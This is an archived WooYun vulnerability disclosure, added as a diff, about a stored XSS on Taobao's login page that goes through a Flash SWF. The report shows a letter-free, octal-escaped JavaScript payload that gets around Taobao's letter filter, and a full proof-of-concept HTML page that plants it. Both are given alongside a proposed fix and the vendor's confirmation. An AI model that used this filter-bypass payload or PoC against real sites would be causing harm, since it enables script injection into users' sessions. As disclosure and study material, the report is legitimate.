@@ -1,0 +1,285 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		一个flash的0day导致的淘宝网存储xss 【续集】  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		一个flash的0day导致的淘宝网存储xss 【续集】  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/多多关照">多多关照</a> 
+</li><li>提交时间：		2013-10-24 08:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-03：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-13：	细节向普通白帽子公开<br/>
+									2013-11-23：	细节向实习白帽子公开<br/>
+									2013-12-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">今天看了http://www.wooyun.org/bugs/wooyun-2013-039481这个帖子，思路挺有意思！狂顶赞！不过作为一个职业的马甲，看了下淘宝对这个漏洞的修复措施，发现修复并不彻底，提交下！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">反编译了一下http://acjstb.aliyun.com/actionlog/flash/JSocket.swf这个文件。<br />
+<br />
+淘宝的修复代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function getlso():String{<br />
+            var _local1:SharedObject = SharedObject.getLocal(&quot;kj&quot;);<br />
+            var _local2:RegExp = new RegExp(&quot;[a-zA-Z]&quot;);<br />
+            if (_local1.data.key == undefined){<br />
+                return (&quot;&quot;);<br />
+            };<br />
+            if (_local2.test(_local1.data.key)){<br />
+                this.setlso(&quot;&quot;);<br />
+                return (&quot;&quot;);<br />
+            };<br />
+            return (_local1.data.key);<br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到，多加一个正则表达式，如果存储的key里存在 [a-zA-Z]的字符，则调用 setlso(&quot;&quot;);<br />
+<br />
+<br />
+<br />
+把所有字母都过滤掉了，那么这样是否就完全不能执行JS代码了呢？<br />
+<br />
+<br />
+<br />
+根据帖子（ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-039481">WooYun: 一个flash的0day导致的淘宝网存储xss(可形成永久后门)</a> ）作者neobyte的描述。<br />
+<br />
+<br />
+<br />
+实际上执行的是JS代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>eval(var __flash_temp = &quot;returned value&quot;; __flash_temp;)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们来尝试构造一个不需要使用任何字母执行代码的版本。<br />
+<br />
+<br />
+<br />
+</p><pre><code>var __flash_temp = &quot;returned value\\&quot;[&#039;substr&#039;][&#039;constructor&#039;](&#039;alert(1)&#039;)();//&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+解释:<br />
+<br />
+<br />
+<br />
+&quot;字符串&quot;[&#039;substr&#039;][&#039;constructor&#039;] 得到 function Function() { [native code] }<br />
+<br />
+<br />
+<br />
+&quot;字符串&quot;[&#039;substr&#039;][&#039;constructor&#039;](&#039;alert(1)&#039;)() 等同于<br />
+<br />
+<br />
+<br />
+Function(&#039;alert(1)&#039;)()<br />
+<br />
+<br />
+<br />
+接着，我们把上面代码里的字符串全部使用8进制转义。<br />
+<br />
+<br />
+<br />
+</p><pre><code>var __flash_temp = &quot;returned value\\&quot;[&#039;\163\165\142\163\164\162&#039;][&#039;\143\157\156\163\164\162\165\143\164\157\162&#039;](&#039;\141\154\145\162\164\50\61\51&#039;)();//&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们所输入的代码，实际上是<br />
+<br />
+<br />
+<br />
+</p><pre><code>\&quot;[&#039;\163\165\142\163\164\162&#039;][&#039;\143\157\156\163\164\162\165\143\164\157\162&#039;](&#039;\141\154\145\162\164\50\61\51&#039;)();//</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到，不包含任何字母，这样可以成功绕过淘宝的过滤措施。<br />
+<br />
+<br />
+<br />
+具体利用代码，见漏洞证明。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">代码从原帖里直接复制过来的（代码版权归neobyte所有），只是把setlso的数据换了下。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+<br />
+&lt;body&gt;<br />
+<br />
+&lt;object id=&quot;JSocket&quot; tabindex=&quot;-1&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;1&quot; height=&quot;1&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab&quot;&gt;<br />
+<br />
+       &lt;param name=&quot;movie&quot; value=&quot;http://acjstb.aliyun.com/actionlog/flash/JSocket.swf&quot;&gt;<br />
+<br />
+       &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;<br />
+<br />
+       &lt;embed name=&quot;JSocket&quot; src=&quot;http://acjstb.aliyun.com/actionlog/flash/JSocket.swf&quot; width=&quot;1&quot; height=&quot;1&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.adobe.com/go/getflashplayer&quot;&gt;<br />
+<br />
+&lt;/object&gt;<br />
+<br />
+&lt;script&gt;<br />
+<br />
+function set(){document[&#039;JSocket&#039;].setlso(&#039;\\&quot;[\&#039;\\163\\165\\142\\163\\164\\162\&#039;][\&#039;\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\&#039;](\&#039;\\141\\154\\145\\162\\164\\50\\61\\51\&#039;)();//&#039;);}<br />
+<br />
+setTimeout(&quot;set()&quot;,5000);<br />
+<br />
+&lt;/script&gt;<br />
+<br />
+&lt;/body&gt;<br />
+<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+访问这个页面后，再访问 login.taobao.com即可看到效果。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/240240465c3e548dfd1e70d943f9fb020e8510e8.jpg" target="_blank"><img src="../images/240240465c3e548dfd1e70d943f9fb020e8510e8.jpg" alt="QQ图片20131024024020.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">我觉得根据漏洞成因来看，正确的修复方式是，过滤掉数据里的 反斜线  \，而不是过滤字母。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/多多关照" title="多多关照">多多关照</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040838" title="一个flash的0day导致的淘宝网存储xss 【续集】">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-10-24 14:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你对我们的支持与关注，该问题正在修复~~</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40838";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
